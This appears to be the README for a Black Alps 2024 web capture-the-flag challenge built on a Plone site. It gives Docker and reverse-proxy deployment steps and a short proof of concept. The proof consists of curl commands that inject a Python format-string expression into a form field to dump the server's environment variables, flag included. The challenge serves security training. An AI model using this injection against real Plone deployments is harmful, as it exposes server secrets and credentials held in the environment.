# Black Alps 2024 CTF - Challenge details - fairy TALES

![Black Alps](plone/img/Logo.svg)

Challenge name: fairy-TALES

Category: Web

Difficulty: MEDIUM

Author: Gata Renault

# Description

> Your tale-enthusiast friend Zoe has written a tale about the mystical Black Alps and published it on a superb website. Could you please give some feedback on the story?


# Requirements

Hardware requirements:
- [Same requirements as Docker](https://6.docs.plone.org/install/containers/index.html).

Software requirements:
- Plone server running on Docker.
- Reverse proxy (e.g. see `webserver` > `default.template` for the configuration file) exposing the port 80 and rewriting the client requests to the Plone backend server as detailed in [nginx, Plone Classic container example](https://6.docs.plone.org/install/containers/examples/nginx-plone.html)


# Deployment Instructions

Deploy the plone server with the `docker-compose.yml` file.

The following default variables are defined in the `.env` file:
```
FLAG=ThisIsTheFlag
SERVER_NAME=zoesblog
SITE_NAME=MyTalesBlog
```

The reverse proxy should be configured as follow:
- Listen on Port 80/443: Accept incoming HTTP(S) requests.
- Set the `Host`, `X-Real-IP`, `X-Forwarded-For` and `X-Forwarded-Proto` client headers
- Rewrites the URL to include `/VirtualHostBase/http/${SERVER_NAME}:80/${SITE_NAME}/VirtualHostRoot/` before passing it to the upstream server.
- Proxy Pass to forward requests with `/VirtualHostBase/` to the backend-server `http://plone:8080`.

# Writeup

COMING SOON.

## Easy PoC

On windows: 
- `curl -X POST http://zoesblog/8815a951-3303-48dd-a9b0-f76a7ed42a85/@@edit -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWRn1I70PHCCA3Jnl" --form "form.widgets.IDublinCore.title=Zoe's Form" --form "form.widgets.thankstitle=Thank You" --form "form.widgets.submitLabelOverride=python: \"{a._os.environ}\".format_map({'a': random})" --form "form.buttons.save=Save"`
- `curl -s http://zoesblog/8815a951-3303-48dd-a9b0-f76a7ed42a85 | findstr "FLAG"`

On Linux:
- `curl -X POST http://zoesblog/8815a951-3303-48dd-a9b0-f76a7ed42a85/@@edit -H "Content-Type: multipart/form-data" -F "form.widgets.IDublinCore.title=Zoe's Form" -F "form.widgets.thankstitle=Thank You" -F "form.widgets.submitLabelOverride=python: \"{a._os.environ}\".format_map({'a': random})" -F "form.buttons.save=Save"`
- `curl -s http://zoesblog/8815a951-3303-48dd-a9b0-f76a7ed42a85 | grep "FLAG"`

NOTE: 
- Replace the `SERVER_NAME` (`zoesblog`) with chosen one.
- Add SSL-encryption in the PoC (`http` -> `https`) if the server only supports TLS.